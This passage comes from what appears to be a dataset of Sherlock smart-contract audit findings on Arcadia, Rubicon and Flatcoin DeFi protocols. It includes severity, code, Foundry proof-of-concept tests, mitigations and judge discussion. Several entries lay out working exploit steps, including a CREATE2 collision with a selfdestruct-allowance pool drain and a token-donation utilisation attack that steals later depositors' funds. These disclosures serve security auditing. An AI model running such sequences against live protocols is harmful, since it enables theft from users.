greater than 0.\nNOTE: It is possible that you find issues related to code not being found. This is because the Uniswap V3 deployment uses foundry’s `vm.getCode()` and we are importing the deployment file from the `accounts-v2` repo to the `lending-v2` repo, which makes foundry throw some errors. To fix this, just compile the contracts in the `accounts-v2` repo and copy the missing folders from the `accounts-v2/out` generated folder into the `lending-v2/out` folder.чThere are several ways to mitigate this issue. One possible option is to perform the transfer of assets when depositing at the same time that the asset is processed, instead of first processing the assets (and storing the Uniswap liquidity) and then transferring them. Another option is to perform a liquidity check after depositing the Uniswap position, ensuring that the liquidity stored in the assetToLiquidity[assetId] mapping and the one returned by the NonFungiblePositionManager are the same.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: high(2)\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/accounts-v2/pull/174.чHigh. The protocol will always believe that there is liquidity deposited in the Uniswap position while in reality the position is empty. This allows for undercollateralized borrows, essentially enabling the protocol to be drained if the attack is performed utilizing several uniswap positions.\nCode Snippet\nTool used\nManual Review
Stargate `STG` rewards are accounted incorrectly by `StakedStargateAM.sol`чmediumч```\nuint256 currentRewardGlobal = _getCurrentReward(positionState_.asset);\nuint256 deltaReward = currentRewardGlobal - assetState_.lastRewardGlobal; ❌\n```\nчStargate LP_STAKING_TIME contract clears and sends rewards to the caller every time `deposit()` is called but StakedStargateAM does not take it into account.\nWhen either mint() or increaseLiquidity() are called the `assetState[asset].lastRewardGlobal` variable is not reset to `0` even though the rewards have been transferred and accounted for on stargate side.\nAfter a call to mint() or increaseLiquidity() any subsequent call to either mint(), increaseLiquidity(), burn(), decreaseLiquidity(), claimRewards() or rewardOf(), which all internally call _getRewardBalances(), will either revert for underflow or account for less rewards than it should because `assetState_.lastRewardGlobal` has not been correctly reset to `0` but `currentRewardGlobal` (which is fetched from stargate) has:\n```\nuint256 currentRewardGlobal = _getCurrentReward(positionState_.asset);\nuint256 deltaReward = currentRewardGlobal - assetState_.lastRewardGlobal; ❌\n```\n\n```\nfunction _getCurrentReward(address asset) internal view override returns (uint256 currentReward) {\n    currentReward = LP_STAKING_TIME.pendingEmissionToken(assetToPid[asset], address(this));\n}\n```\n\nPOC\n```\nfunction testFork_WrongRewards() public {\n    uint256 initBalance = 1000 * 10 ** USDbC.decimals();\n    // Given : A user deposits in the Stargate USDbC pool, in exchange of an LP token.\n    vm.startPrank(users.accountOwner);\n    deal(address(USDbC), users.accountOwner, initBalance);\n\n    USDbC.approve(address(router), initBalance);\n    router.addLiquidity(poolId, initBalance, users.accountOwner);\n    // assert(ERC20(address(pool)).balanceOf(users.accountOwner) > 0);\n\n    // And : The user stakes the LP token via the StargateAssetModule\n    uint256 stakedAmount = ERC20(address(pool)).balanceOf(users.accountOwner);\n    ERC20(address(pool)).approve(address(stakedStargateAM), stakedAmount);\n    uint256 tokenId = stakedStargateAM.mint(address(pool), uint128(stakedAmount) / 4);\n\n    //We let 10 days pass to accumulate rewards.\n    vm.warp(block.timestamp + 10 days);\n\n    // User increases liquidity of the position.\n    uint256 initialRewards = stakedStargateAM.rewardOf(tokenId);\n    stakedStargateAM.increaseLiquidity(tokenId, 1);\n\n    vm.expectRevert();\n    stakedStargateAM.burn(tokenId); //❌ User can't call burn because of underflow\n\n    //We let 10 days pass, this accumulates enough rewards for the call to burn to succeed\n    vm.warp(block.timestamp + 10 days);\n    uint256 currentRewards = stakedStargateAM.rewardOf(tokenId);\n    stakedStargateAM.burn(tokenId);\n\n    assert(currentRewards - initialRewards < 1e10); //❌ User gets less rewards than he should. The rewards of the 10 days the user couldn't withdraw his position are basically zeroed out.\n    vm.stopPrank();\n}\n```\nчAdjust the `assetState[asset].lastRewardGlobal` correctly or since every action (mint(), `burn()`, `increaseLiquidity()`, `decreaseliquidity()`, claimReward()) will have the effect of withdrawing all the current rewards it's possible to change the function _getRewardBalances() to use the amount returned by _getCurrentReward() as the `deltaReward` directly:\n```\nuint256 deltaReward = _getCurrentReward(positionState_.asset);\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: high(1)\nThomas-Smets\nDuplicate from https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/18\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/accounts-v2/pull/170.чUsers will not be able to take any action on their positions until `currentRewardGlobal` is greater or equal to `assetState_.lastRewardGlobal`. After that they will be able to perform actions but their position will account for less rewards than it should because a total amount of `assetState_.lastRewardGlobal` rewards is nullified.\nThis will also DOS the whole lending/borrowing system if an Arcadia Stargate position is used as collateral because rewardOf(), which is called to estimate the collateral value, also reverts.\nCode Snippet\nTool used\nManual Review
`CREATE2` address collision against an Account will allow complete draining of lending poolsчmediumч```\naccount = address(\n    new Proxy{ salt: keccak256(abi.encodePacked(salt, tx.origin)) }(\n        versionInformation[accountVersion].implementation\n    )\n);\n```\nчThe factory function `createAccount()` creates a new account contract for the user using `CREATE2`. We show that a meet-in-the-middle attack at finding an address collision against an undeployed account is possible. Furthermore, such an attack allows draining of all funds from the lending pool.\nThe attack consists of two parts: Finding a collision, and actually draining the lending pool. We describe both here:\nPoC: Finding a collision\nNote that in `createAccount`, `CREATE2` salt is user-supplied, and `tx.origin` is technically also user-supplied:\n```\naccount = address(\n    new Proxy{ salt: keccak256(abi.encodePacked(salt, tx.origin)) }(\n        versionInformation[accountVersion].implementation\n    )\n);\n```\n\nThe address collision an attacker will need to find are:\nOne undeployed Arcadia account address (1).\nArbitrary attacker-controlled wallet contract (2).\nBoth sets of addresses can be brute-force searched because:\nAs shown above, `salt` is a user-supplied parameter. By brute-forcing many `salt` values, we have obtained many different (undeployed) wallet accounts for (1).\n(2) can be searched the same way. The contract just has to be deployed using `CREATE2`, and the `salt` is in the attacker's control by definition.\nAn attacker can find any single address collision between (1) and (2) with high probability of success using the following meet-in-the-middle technique, a classic brute-force-based attack in cryptography:\nBrute-force a sufficient number of values of salt ($2^{80}$), pre-compute the resulting account addresses, and efficiently store them e.g. in a Bloom filter data structure.\nBrute-force contract pre-computation to find a collision with any address within the stored set in step 1.\nThe feasibility, as well as detailed technique and hardware requirements of finding a collision, are sufficiently described in multiple references:\n1: A past issue on Sherlock describing this attack.\n2: EIP-3607, which rationale is this exact attack. The EIP is in final state.\n3: A blog post discussing the cost (money and time) of this exact attack.\nThe hashrate of the BTC network has reached $6 \times 10^{20}$ hashes per second as of time of writing, taking only just $33$ minutes to achieve $2^{80}$ hashes. A fraction of this computing power will still easily find a collision in a reasonably short timeline.\nPoC: Draining the lending pool\nEven given EIP-3607 which disables an EOA if a contract is already deployed on top, we show that it's still possible to drain the lending pool entirely given a contract collision.\nAssuming the attacker has already found an address collision against an undeployed account, let's say `0xCOLLIDED`. The steps for complete draining of a lending pool are as follow:\nFirst tx:\nDeploy the attack contract onto address `0xCOLLIDED`.\nSet infinite allowance for {0xCOLLIDED ---> attacker wallet} for any token they want.\nDestroy the contract using `selfdestruct`.\nPost Dencun hardfork, `selfdestruct` is still possible if the contract was created in the same transaction. The only catch is that all 3 of these steps must be done in one tx.\nThe attacker now has complete control of any funds sent to `0xCOLLIDED`.\nSecond tx:\nDeploy an account to `0xCOLLIDED`.\nDeposit an asset, collateralize it, then drain the collateral using the allowance set in tx1.\nRepeat step 2 for as long as they need to (i.e. collateralize the same asset multiple times).\nThe account at `0xCOLLIDED` is now infinitely collateralized.\nFunds for step 2 and 3 can be obtained through external flash loan. Simply return the funds when this step is finished.\nAn infinitely collateralized account has infinite borrow power. Simply borrow all the funds from the lending pool and run away with it, leaving an infinity collateral account that actually holds no funds.\nThe attacker has stolen all funds from the lending pool.\nCoded unit-PoC\nWhile we cannot provide an actual hash collision due to infrastructural constraints, we are able to provide a coded PoC to prove the following two properties of the EVM that would enable this attack:\nA contract can be deployed on top of an address that already had a contract before.\nBy deploying a contract and self-destruct in the same tx, we are able to set allowance for an address that has no bytecode.\nHere is the PoC, as well as detailed steps to recreate it:\nPaste the following file onto Remix (or a developing environment of choice): https://gist.github.com/midori-fuse/087aa3248da114a0712757348fcce814\nDeploy the contract `Test`.\nRun the function `Test.test()` with a salt of your choice, and record the returned address. The result will be:\n`Test.getAllowance()` for that address will return exactly `APPROVE_AMOUNT`.\n`Test.getCodeSize()` for that address will return exactly zero.\nThis proves the second property.\nUsing the same salt in step 3, run `Test.test()` again. The tx will go through, and the result will be:\n`Test.test()` returns the same address as with the first run.\n`Test.getAllowance()` for that address will return twice of `APPROVE_AMOUNT`.\n`Test.getCodeSize()` for that address will still return zero.\nThis proves the first property.\nThe provided PoC has been tested on Remix IDE, on the Remix VM - Mainnet fork environment, as well as testing locally on the Holesky testnet fork, which as of time of writing, has been upgraded with the Dencun hardfork.ч"The mitigation method is to prevent controlling over the deployed account address (or at least severely limit that). Some techniques may be:\nDo not allow a user-supplied `salt`, as well as do not use the user address as a determining factor for the `salt`.\nUse the vanilla contract creation with `CREATE`, as opposed to `CREATE2`. The contract's address is determined by `msg.sender` (the factory), and the internal `nonce` of the factory (for a contract, this is just ""how many other contracts it has deployed"" plus one).\nThis will prevent brute-forcing of one side of the collision, disabling the $O(2^{81})$ search technique.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: high(5)\nnevillehuang\nRequest PoC to facilitate discussion between sponsor and watson.\nI believe this is low severity given the extreme unlikeliness of it occuring, with the addition that a insanely huge amount of funds is required to perform this attack without guarantee\nsherlock-admin\nPoC requested from @PUSH0\nRequests remaining: 8\nmidori-fuse\nHello, thanks for asking.\nThe reason we believe this is a valid HM is the following:\nThe impact is undoubtedly high because a pool can be drained completely.\nAlthough only one pool can be drained per collision found, that itself is high impact. Furthermore the protocol will be deployed on several EVM chains, so the attacker can simultaneously drain one pool per chain.\nWe are re-citing a past issue on Sherlock discussing the same root cause of CREATE2 collision, as the issue discussion sufficiently describes:\nThe attack cost at the time of the Kyber contest.\nThe probability of a successful attack was shown to increase to 86% using $2^{81}$ hashes, and 99.96% using twice that power. This is not a low probability by any chance.\nFurthermore one may also find multiple collisions using this technique, which will allow draining of more than one pool.\nHardware advancements can only increase the computing power, not decrease it. Since the Kyber contest, BTC hashrate has already increased sigfinicantly (almost doubled), and it has been just 6 months since.\nThe more protocols with this issue there are, the more profit there is to finding a collision.\nTherefore the likelihood of this attack can only increase as time passes. Complete draining of a pool also cannot be low severity.\nEssentially by identifying this attack, we have proven the existence of a time bomb, that will allow complete draining of a certain pool from any given chain. We understand that past decisions are not considered a source of truth, however the issue discussion and the external resources should still provide an objective reference to determine this issue's validity. Furthermore let's consider the impact if it were to happen as well.\nnevillehuang\n@Czar102 I am interested in hearing your opinion here with regards to the previous issue here as well.\nThomas-Smets\nDon't think it is a high, requires a very big upfront cost with no certainty on pay out as attacker. And while our factory is immutable, we can pause indefinitely the creation of new accounts.\nIf at some point the attack becomes a possibility, we can still block it.\nTo make it even harder, we are thinking to add the block.timestamp and block.number to the hash. Then the attacker, after they successfully found a hash collision, already has to execute the attack at a fixed block and probably conspire with the sequencer to ensure that also the time is fixed.\nmidori-fuse\nAgree that it's not a high, the attack cost makes a strong external condition.\nRe: mitigations. I don't think pausing the contract or blocking the attack makes sense, the attack would sort of finish in a flash before you know it (and in a shorter duration than a pausing multisig can react).\nRegarding the fix, adding `block.timestamp` and `block.number` technically works, but doesn't really make sense as opposed to just using the vanilla creation. The main purpose of `CREATE2` is that contract addresses are deterministic and pre-computable, you can do a handful of things with this information e.g. funds can be sent there in advance before contract creation, or crafting a customized address without deploying. By adding block number and timestamp, the purpose is essentially defeated.\nBut since it technically works, there's not really a point in opposing it I suppose. A full fix would involve reworking the account's accounting, which I think is quite complex and may open up more problems.\nA fix that would still (partially, but should be sufficient) retain the mentioned functionalities could be just using a `uint64` salt, or the last 64 bits of the address only, or anything that doesn't let the user determine more than 64 bits of the input. Then the other side of the brute force has to achieve $2^{15} = 32768$ times the mentioned hashing power in the attack to achieve a sizeable collision probability (and such probability is still less than a balanced $2^{80}$ brute force anyway).\nThomas-Smets\nI don't think pausing the contract or blocking the attack makes sense\nMeant it in the sense that if such an attack occurs we can pause it, assuming we would not be the first victim. Not that we can frontrun a particular attack with a pause.\nRegarding the fix, adding block.timestamp and block.number technically works, but doesn't really make sense as opposed to just using the vanilla creation.\nFair point.\nA fix that would still (partially, but should be sufficient) retain the mentioned functionalities could be just using a uint64 salt, or the last 64 bits of the address only, or anything that doesn't let the user determine more than 64 bits of the input.\nI do like this idea thanks! We can use 32 bits from the tx.origin and 32 bits from a salt.\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/accounts-v2/pull/176."чComplete draining of a lending pool if an address collision is found.\nWith the advancement of computing hardware, the cost of an attack has been shown to be just a few million dollars, and that the current Bitcoin network hashrate allows about $2^{80}$ in about half an hour. The cost of the attack may be offsetted with longer brute force time.\nFor a DeFi lending pool, it is normal for a pool TVL to reach tens or hundreds of millions in USD value (top protocols' TVL are well above the billions). It is then easy to show that such an attack is massively profitable.\nCode Snippet\nTool used\nManual Review, Remix IDE
Utilisation Can Be Manipulated Far Above 100%чmediumч```\nfunction setUp() public virtual override(Fuzz_Lending_Test) {\n        Fuzz_Lending_Test.setUp();\n        deployArcadiaLendingWithAccounts();\n\n        vm.prank(users.creatorAddress);\n        pool.addTranche(address(tranche), 50);\n\n        // Deposit funds in the pool.\n        deal(address(mockERC20.stable1), users.liquidityProvider, type(uint128).max, true);\n\n        vm.startPrank(users.liquidityProvider);\n        mockERC20.stable1.approve(address(pool), 100);\n        //only 1 asset was minted to the liquidity provider\n        tranche.mint(100, users.liquidityProvider);\n        vm.stopPrank();\n\n        vm.startPrank(users.creatorAddress);\n        pool.setAccountVersion(1, true);\n        pool.setInterestParameters(\n            Constants.interestRate, Constants.interestRate, Constants.interestRate, Constants.utilisationThreshold\n        );\n        vm.stopPrank();\n\n        vm.prank(users.accountOwner);\n        proxyAccount.openMarginAccount(address(pool));\n    }\n```\nч"The utilisation of the protocol can be manipulated far above 100% via token donation. It is easiest to set this up on an empty pool. This can be used to manipulate the interest to above 10000% per minute to steal from future depositors.\nThis attack is inspired by / taken from this bug report for Silo Finance. I recommend reading it as is very well written: https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a\nThe utilisation is basically assets_borrowed / assets_loaned. A higher utilisation creates a higher interest rate. This is assumed to be less than 100%. However if it exceeds 100%, there is no cap here:\nNormally, assets borrowed should never exceed assets loaned, however this is possible in Arcadia as the only thing stopping a borrow exceeding loans is that the `transfer` of tokens will revert due to not enough tokens in the `Lending pool`. However, an attacker can make it not revert by simply sending tokens directly into the lending pool. For example using the following sequence:\ndeposit 100 assets into tranche\nUse ERC20 Transfer to transfer `1e18` assets into the `LendingPool`\nBorrow the `1e18` assets\nThese are the first steps of the coded POC at the bottom of this issue. It uses a token donation to make a borrow which is far larger than the loan amount.\nIn the utilisation calculation, this results in a incredibly high utilisation rate and thus interest rate as it is not capped at 100%. This is why some protocols implement a hardcap of utilisation at 100%.\nThe interest rate is so high that over 2 minutes, 100 assets grows to over100000 assets, or a 100000% interest over 2 minutes. The linked similar exploit on Silo Finance has an even more drastic interest manipulation which could drain the whole protocol in a block. However I did not optimise the numbers for this POC.\nNote that the 1e18 assets ""donated"" to the protocol are not lost. They can simply be all borrowed into an attackers account.\nThe attacker can set this up when the initial lending pool is empty. Then, they can steal assets from subsequent depositors due to the huge amount of interest collected from their small initial deposit\nLet me sum up the attack in the POC:\ndeposit 100 assets into tranche\nUse ERC20 Transfer to transfer `1e18` assets into the `LendingPool`\nBorrow the `1e18` assets\nVictim deposits into tranche\nAttacker withdraws the victims funds which is greater than the 100 assets the attacker initially deposited\nHere is the output from the console.logs:\n```\nfunction setUp() public virtual override(Fuzz_Lending_Test) {\n        Fuzz_Lending_Test.setUp();\n        deployArcadiaLendingWithAccounts();\n\n        vm.prank(users.creatorAddress);\n        pool.addTranche(address(tranche), 50);\n\n        // Deposit funds in the pool.\n        deal(address(mockERC20.stable1), users.liquidityProvider, type(uint128).max, true);\n\n        vm.startPrank(users.liquidityProvider);\n        mockERC20.stable1.approve(address(pool), 100);\n        //only 1 asset was minted to the liquidity provider\n        tranche.mint(100, users.liquidityProvider);\n        vm.stopPrank();\n\n        vm.startPrank(users.creatorAddress);\n        pool.setAccountVersion(1, true);\n        pool.setInterestParameters(\n            Constants.interestRate, Constants.interestRate, Constants.interestRate, Constants.utilisationThreshold\n        );\n        vm.stopPrank();\n\n        vm.prank(users.accountOwner);\n        proxyAccount.openMarginAccount(address(pool));\n    }\n```\n\n```\n    function testScenario_Poc() public {\n\n        uint poolBalance = mockERC20.stable1.balanceOf(address(pool));\n        console.log(poolBalance, ""initial pool balance. This is also the amount deposited into tranche"");\n        vm.startPrank(users.liquidityProvider);\n        mockERC20.stable1.approve(address(pool), 1e18);\n        mockERC20.stable1.transfer(address(pool),1e18);\n        vm.stopPrank();\n\n        // Given: collateralValue is smaller than maxExposure.\n        //amount token up to max\n        uint112 amountToken = 1e30;\n        uint128 amountCredit = 1e10;\n\n        //get the collateral factor\n        uint16 collFactor_ = Constants.tokenToStableCollFactor;\n        uint256 valueOfOneToken = (Constants.WAD * rates.token1ToUsd) / 10 ** Constants.tokenOracleDecimals;\n\n        //deposits token1 into proxyAccount\n        depositTokenInAccount(proxyAccount, mockERC20.token1, amountToken);\n\n        uint256 maxCredit = (\n            //amount credit is capped based on amount Token\n            (valueOfOneToken * amountToken) / 10 ** Constants.tokenDecimals * collFactor_ / AssetValuationLib.ONE_4\n                / 10 ** (18 - Constants.stableDecimals)\n        );\n\n\n        vm.startPrank(users.accountOwner);\n        //borrow the amountCredit to the proxy account\n        pool.borrow(amountCredit, address(proxyAccount), users.accountOwner, emptyBytes3);\n        vm.stopPrank();\n\n        assertEq(mockERC20.stable1.balanceOf(users.accountOwner), amountCredit);\n\n        //warp 2 minutes into the future.\n        vm.roll(block.number + 10);\n        vm.warp(block.timestamp + 120);\n\n        console.log(""warp 2 minutes into future"");\n\n        address victim = address(123);\n        deal(address(mockERC20.stable1), victim, type(uint128).max, true);\n\n        vm.startPrank(victim);\n        mockERC20.stable1.approve(address(pool), type(uint128).max);\n        uint shares = tranche.mint(1e3, victim);\n        vm.stopPrank();\n\n        console.log(""mint was used rather than deposit to ensure no rounding error. This a UTILISATION manipulation attack not a share inflation attack"");\n\n        //function withdraw(uint256 assets, address receiver, address owner_)\n\n        //WITHDRAWN 1e5\n        vm.startPrank(users.liquidityProvider);\n        uint withdrawShares = tranche.withdraw(1e5, users.liquidityProvider,users.liquidityProvider);\n        vm.stopPrank();\n\n        console.log(withdrawShares, ""shares were burned in exchange for 100000 assets. Users.LiquidityProvider only deposited 100 asset in the tranche but withdrew 100000 assets!"");\n\n\n    }\n```\n"ч"Add a utilisation cap of 100%. Many other lending protocols implement this mitigation.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: utilization should be mitigated; high(6)\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/lending-v2/pull/137.\nsherlock-admin2\nThis should be high as it can steal both the first subsequent deposit and all future deposits after that. The original linked issue for Silo Finance was Critical although Silo had multiple simultaneous pools. The interest rate formula for both Silo and Arcadia are the same, but that POC was more optimised which shows a faster rate of massive interest accrual.\nYou've deleted an escalation for this issue.\nnevillehuang\nHi @Banditx0x I believe the following factors mentioned by @zzykxx in his report warrants the decrease in severity:\nThe interest rate is capped at 2^80 (~= 10^24) because of the downcasting in LendingPool::_calculateInterestRate(). The maximum interest is about 100% every 20 days.\nThe tokens sent directly to the pool by the griefer are effectively lost and can be transferred to the treasury.\nThe virtual shares implementation in the tranches might prevent the attacker from collecting all of the interest.\nSponsors Comments:\nimpact is only possible in quasi empty pools, and cost for doing it is largely in line with the damage done. In the example of 93, only 100 assets are in the pool, 1e18 are donated by the attacker → only the user borrowing the 100 assets is affected, so in this case of an empty pool, not a lot, and even more, the 1e18 can indeed be borrowed by the attacker, but he’ll be liquidated and incur a loss himself: he is the one paying the interest he jacked up (even if only >100 is recovered through liquidations, the LP actually profits, since the penalty is paid on a larger amount than what the “good” lp borrowed out). → low probability, cost is high → medium at most\nzzykxx\nHey @Banditx0x, correct me if I'm wrong, but I think the following applies here:\nIn the Silo finance exploit depositing assets in a pool allowed to use the shares of the said pool to borrow other assets. An attacker could deposit a small amount, borrow his own donation (increasing the utilization rate), which had the effect of increasing the value of his initial donation. Then he could use the initial donation, which is now extremely overvalued, as collateral to borrow assets and steal funds. This is not possible here because the shares of a lending pool cannot be used as collateral to borrow assets.\nUnlike the Silo finance case, the maximum interest rate achievable is capped at `uint80` =~ `10^24`.\nTo steal a sensible amount of funds the attacker should first deposit more than ""100"" assets. But by depositing more than ""100"" assets the required amount to donate to achieve maximum utilization manipulation also increases. You could argue this is not the case and more time just needs to pass, but if anybody in the meantime deposits extra funds in the tranche and/or calls `updateInterestRate()` the interest rate will diminish the speed at which it increases.\nThe attacker, which as you said can borrow his own donation, also has to pay interest on it.\nIn your POC the virtual shares are not taken into account. As we know virtual shares cause a loss to the first depositor, this depends on the amount of decimals and the value of the underlying and also by how much the virtual share is set at.\nSome damage can be caused by abusing this issue, but I think the damage is not big enough to classify this as high severity. Of course, I would be more than happy to be proven wrong since this would also be in my personal interest.\nBanditx0x\n@zzykxx thanks for the response. You're right that the Silo finance situation had much higher impact due to manipulation of one asset allowing borrows of another. However I had originally thought that the impact would be High even with this in mind as it had the same impact as the share inflation attack which historically has had high severity.\nI hadn't realised the maximum interest rate was capped at `uint80`, which indeed caps the interest rate to far lower than the issue I had linked.\nGiven the slower interest rate accrual than I originally thought, I agree with the medium severity.\nEdit: i deleted past escalation comment due to this discussion. Just so this conversation makes sense for future readers.\nCzar102\nPlanning to reject the escalation and leave the issue as is.\nCzar102\nResult: Medium Has duplicates\nmidori-fuse\nWasn't the escalation deleted before the period end?\nBanditx0x's comment was last edited on 5:26AM UTC, while the escalation period end was 12:36PM same day.\nCzar102\n@midori-fuse It looks so, we will look into it. Thank you for bringing this up!\nCzar102\nThe escalation should have been deleted, there was an issue on Sherlock's part that's now resolved."чAn early depositor can steal funds from future depositors through utilisation/interest rate manipulation.\nCode Snippet\nTool used\nManual Review
Pairs with ""MAX_FEE"" can revert due to rounding inconsistencies"чmediumч```\nuint256 feeAmount = fee.applyFee\n                ? order.outputs[i].amount.mulDivUp(fee.fee, DENOM)\n                : order.outputs[i].amount.mulDivUp(baseFee, DENOM);\n```\nч"If the pair has set the max fee by the fee controller admin which is ""1_000"" then depending on the amount to be swapped, the tx can revert due to rounding error.\nWhen the fee amount is calculated inside the RubiconFeeController, the fee amount is rounded down.\n```\nuint256 feeAmount = fee.applyFee\n                ? order.outputs[i].amount.mulDivUp(fee.fee, DENOM)\n                : order.outputs[i].amount.mulDivUp(baseFee, DENOM);\n```\n\nthen, ProtocolFees abstract contract will do a double check on the fee taken as follows:\n```\nif (feeOutput.amount > tokenValue.mulDivDown(MAX_FEE, DENOM)) {\n                revert FeeTooLarge(\n                    feeOutput.token,\n                    feeOutput.amount,\n                    feeOutput.recipient\n                );\n            }\n```\n\nAs we can see, it uses mulDivDown, so if the calculation in the FeeController rounds up, the transaction will revert.\nTextual PoC: Suppose the fee pair is set to ""1_000"" for tokens A and B. Alice sends an order to sell ""111111111111111111111"" (111.11 in 18 decimals) token A for token B.\nWithin the fee controller, the fee amount will be calculated as: 111111111111111111111 * 1000 / 100_000 (roundUp) = 1111111111111111112\nSubsequently, during execution, within the ProtocolFees contract, the maximum fee amount will be computed as: 111111111111111111111 * 1000 / 100_000 (roundDown) = 1111111111111111111\nConsequently, the transaction will revert because 1111111111111111111 > 1111111111111111112.\nCoded PoC:\n```\n// forge test --match-contract GladiusReactorTest --match-test test_FeesRounding -vv\n    function test_FeesRounding(uint amount) external {\n        // @dev there will be plenty of values reverting this test. \n        vm.assume(amount <= type(uint128).max);\n        vm.assume(amount >= 1e6);\n\n        uint DENOM = 100_000;\n        uint FEE = 1_000;\n\n        uint resultDown = FixedPointMathLib.mulDivDown(amount, FEE, DENOM);\n        uint resultUp = FixedPointMathLib.mulDivUp(amount, FEE, DENOM);\n\n        assertEq(resultDown, resultUp);\n    }\n```\n"ч"
Malicious keepers can manipulate the price when executing an orderчhighч```\nfunction updatePriceFeeds(\n    bytes[] calldata updateData\n) public payable override {\n    uint totalNumUpdates = 0;\n    for (uint i = 0; i < updateData.length; ) {\n        if (\n            updateData[i].length > 4 &&\n            UnsafeCalldataBytesLib.toUint32(updateData[i], 0) ==\n            ACCUMULATOR_MAGIC\n        ) {\n            totalNumUpdates += updatePriceInfosFromAccumulatorUpdate(\n                updateData[i]\n            );\n        } else {\n            updatePriceBatchFromVm(updateData[i]);\n            totalNumUpdates += 1;\n        }\n\n        unchecked {\n            i++;\n        }\n    }\n    uint requiredFee = getTotalFee(totalNumUpdates);\n    if (msg.value < requiredFee) revert PythErrors.InsufficientFee();\n}\n```\nч"Malicious keepers can manipulate the price when executing an order by selecting a price in favor of either the LPs or long traders, leading to a loss of assets to the victim's party.\nWhen the keeper executes an order, it was understood from the protocol team that the protocol expects that the keeper must also update the Pyth price to the latest one available off-chain. In addition, the contest page mentioned that ""an offchain price that is pulled by the keeper and pushed onchain at time of any order execution"".\nThis requirement must be enforced to ensure that the latest price is always used.\nHowever, this requirement can be bypassed by malicious keepers. A keeper could skip or avoid the updating of the Pyth price by passing in an empty `priceUpdateData` array, which will pass the empty array to the `OracleModule.updatePythPrice` function.\nWhen the Pyth's `Pyth.updatePriceFeeds` function is executed, the `updateData` parameter will be set to an empty array.\nInspecting the source code of Pyth's on-chain contract, the `Pyth.updatePriceFeeds` function will not perform any update since the `updateData.length` will be zero in this instance.\nhttps://goerli.basescan.org/address/0xf5bbe9558f4bf37f1eb82fb2cedb1c775fa56832#code#F24#L75\n```\nfunction updatePriceFeeds(\n    bytes[] calldata updateData\n) public payable override {\n    uint totalNumUpdates = 0;\n    for (uint i = 0; i < updateData.length; ) {\n        if (\n            updateData[i].length > 4 &&\n            UnsafeCalldataBytesLib.toUint32(updateData[i], 0) ==\n            ACCUMULATOR_MAGIC\n        ) {\n            totalNumUpdates += updatePriceInfosFromAccumulatorUpdate(\n                updateData[i]\n            );\n        } else {\n            updatePriceBatchFromVm(updateData[i]);\n            totalNumUpdates += 1;\n        }\n\n        unchecked {\n            i++;\n        }\n    }\n    uint requiredFee = getTotalFee(totalNumUpdates);\n    if (msg.value < requiredFee) revert PythErrors.InsufficientFee();\n}\n```\n\nThe keeper is permissionless, thus anyone can be a keeper and execute order on the protocol. If this requirement is not enforced, keepers who might also be LPs (or collude with LPs) can choose whether to update the Pyth price to the latest price or not, depending on whether the updated price is in favor of the LPs. For instance, if the existing on-chain price ($1000 per ETH) is higher than the latest off-chain price ($950 per ETH), malicious keepers will use the higher price of $1000 to open the trader's long position so that its position's entry price will be set to a higher price of $1000. When the latest price of $950 gets updated, the longer position will immediately incur a loss of $50. Since this is a zero-sum game, long traders' loss is LPs' gain.\nNote that per the current design, when the open long position order is executed at $T2$, any price data with a timestamp between $T1$ and $T2$ is considered valid and can be used within the `executeOpen` function to execute an open order. Thus, when the malicious keeper uses an up-to-date price stored in Pyth's on-chain contract, it will not revert as long as its timestamp is on or after $T1$.\n\nAlternatively, it is also possible for the opposite scenario to happen where the keepers favor the long traders and choose to use a lower older price on-chain to execute the order instead of using the latest higher price. As such, the long trader's position will be immediately profitable after the price update. In this case, the LPs are on the losing end.\nSidenote: The oracle's `maxDiffPercent` check will not guard against this attack effectively. For instance, in the above example, if the Chainlink price is $975 and the `maxDiffPercent` is 5%, the Pyth price of $950 or $1000 still falls within the acceptable range. If the `maxDiffPercent` is reduced to a smaller margin, it will potentially lead to a more serious issue where all the transactions get reverted when fetching the price, breaking the entire protocol."ч"Ensure that the keepers must update the Pyth price when executing an order. Perform additional checks against the `priceUpdateData` submitted by the keepers to ensure that it is not empty and `priceId` within the `PriceInfo` matches the price ID of the collateral (rETH), so as to prevent malicious keeper from bypassing the price update by passing in an empty array or price update data that is not mapped to the collateral (rETH).\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\ninvalid\nrashtrakoff\nI don't believe this is an issue due to the check for price freshness here. However we can probably implement the suggestion for more protection.\nnevillehuang\n@rashtrakoff If I understand correctly, as long as freshness of price does not exceed `maxAge`, it is an accepted updated price, if not it will revert, hence making this issue invalid.\nnevillehuang\nHi @rashtrakoff here is LSW comments, which seems valid to me.\nThe check at Line 111 basically checks for deviation between the on-chain and off-chain price deviation. If the two prices deviate by a certain percentage `maxDiffPercent` (I recall the test or deployment script set it as 5%), the TX will revert.\nHowever, it is incorrect that this check will prevent this issue. I expected that the sponsor might assume that this check might prevent this issue during the audit. Thus, in the report (at the end of the ""Vulnerability Detail""), I have documented the reasons why this oracle check would not help to prevent this issue, and the example and numbers in the report are specially selected to work within the 5% price deviation 🙂\nSidenote: The oracle's maxDiffPercent check will not guard against this attack effectively. For instance, in the above example, if the Chainlink price is $975 and the maxDiffPercent is 5%, the Pyth price of $950 or $1000 still falls within the acceptable range. If the maxDiffPercent is reduced to a smaller margin, it will potentially lead to a more serious issue where all the transactions get reverted when fetching the price, breaking the entire protocol.\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/277.\n0xLogos\nEscalate\nLow (med at best)\nOracle's prices discrepancy should be within trader fee charged.\nsherlock-admin2\nEscalate\nLow (med at best)\nOracle's prices discrepancy should be within trader fee charged.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit 